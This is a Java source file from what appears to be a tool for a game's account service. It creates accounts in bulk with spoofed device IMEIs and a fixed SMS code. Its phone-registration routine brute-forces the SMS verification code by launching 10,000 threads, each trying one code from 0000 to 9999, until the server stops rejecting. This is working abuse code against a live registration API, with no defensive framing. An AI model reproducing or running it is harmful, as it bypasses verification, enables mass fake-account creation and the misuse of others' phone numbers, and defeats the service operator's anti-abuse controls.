package smf.icdada;

import com.alibaba.fastjson2.JSONArray;
import com.alibaba.fastjson2.JSONObject;
import com.alibaba.fastjson2.JSONWriter;

import java.io.File;
import java.io.FileWriter;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class CreateAccount {
    private static final String APP_ID = String.valueOf(Inter.appId);
    private static final String CHANNEL_ID = String.valueOf(Inter.channelId);
    private static final String SDK_VERSION = "2.0.0";

    public static void createNewUserQuickly(final int num) throws Exception {
        JSONObject users = new JSONObject();
        users.put("Users", new JSONArray());
        for (int i = 0; i < num; i++) {
            String password = generatePassword();
            JSONObject user = createUser(password);
            users.getJSONArray("Users").add(user);
        }
        writeUsersToFile(users);
    }

    public static void createNewUserWithPhone(final String phone, final String password) throws Exception {
        verifySMS(phone);

        for (int i = 0; i <= 9999; i++) {
            final int[] ii = new int[]{i};
            new Thread(() -> {
                try {
                    registerUser(phone, password, ii);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }).start();
        }
    }

    private static String generatePassword() {
        String pass = "803666" + MD5((int) (Math.random() * 999999999) + "803666" + MD5(Math.random() * 6666666 + "")).substring(0, 10);
        return MD5(pass);
    }

    private static JSONObject createUser(String password) throws Exception {
        String request = "head={\"appId\":" + APP_ID + ",\"channelId\":" + CHANNEL_ID + ",\"sdkVersion\":\"" + SDK_VERSION + "\"}&registerInfo={\"password\":\"" + password + "\",\"registerImei\":\"d4a69032b29bf0cb\",\"smsVerifyCode\":\"466\"}&md5=b97259c1c0b6a077e7b7c6d89e3cf8de";
        String response = CreateAccountCrypto.decrypt(CreateAccountSender.doQuest(CreateAccountCrypto.encrypt(request), "oneKeyRegister"));
        JSONObject user = JSONObject.parse(CreateAccountCrypto.decrypt(JSONObject.parse(response).getString("content")));
        user.put("password", password);
        return user;
    }

    private static void writeUsersToFile(JSONObject users) throws Exception {
        String newUserFolderUrl = System.getProperty("user.dir") + File.separator + "NewUsers";
        File newUserFolder = new File(newUserFolderUrl);
        if (!newUserFolder.exists()) newUserFolder.mkdir();
        String newUserFileUrl = System.getProperty("user.dir") + File.separator + "NewUsers" + File.separator + "NewUsers_" + DateTimeFormatter.ofPattern("MM-dd-HH-mm").format(LocalDateTime.now()) + ".json";
        File newUserFile = new File(newUserFileUrl);
        try (FileWriter fileWriter = new FileWriter(newUserFile)) {
            fileWriter.write(users.toJSONString(JSONWriter.Feature.WriteMapNullValue, JSONWriter.Feature.PrettyFormat));
            fileWriter.flush();
        }
    }

    private static void verifySMS(String phone) throws Exception {
        String request = "head={\"appId\":" + APP_ID + ",\"channelId\":" + CHANNEL_ID + ",\"sdkVersion\":\"" + SDK_VERSION + "\"}&verifySMS={\"phone\":\"" + phone + "\",\"smsType\":\"register\"}&md5=c871511533afd4154ac5576e20a5bdcd";
        String response = CreateAccountCrypto.decrypt(CreateAccountSender.doQuest(CreateAccountCrypto.encrypt(request), "genVerifySms"));
        Log.a(response);
    }

    private static void registerUser(String phone, String password, int[] ii) throws Exception {
        String y = String.format("%04d", ii[0]);
        String request = "head={\"appId\":" + APP_ID + ",\"channelId\":" + CHANNEL_ID + ",\"sdkVersion\":\"" + SDK_VERSION + "\"}&registerInfo={\"password\":\"" + MD5(password) + "\",\"phone\":\"" + phone + "\",\"registerImei\":\"b7cfe56034188670\",\"smsVerifyCode\":\"" + y + "\"}&md5=e6cb038859b93a01e5775be34f6238d4";
        String response = CreateAccountCrypto.decrypt(CreateAccountSender.doQuest(CreateAccountCrypto.encrypt(request), "register"));
        String content = JSONObject.parse(response).getString("content");

        if (!content.equals("验证码错误")) {
            Log.s("创建成功");
            ii[0] = 9999;
        } else if (ii[0] % 100 == 0) {
            Log.e(String.valueOf(ii[0]));
        }
    }

    private static String MD5(String toBeHashed) {
        return new String(HttpCrypto.getMD5(toBeHashed), StandardCharsets.UTF_8);
    }
}
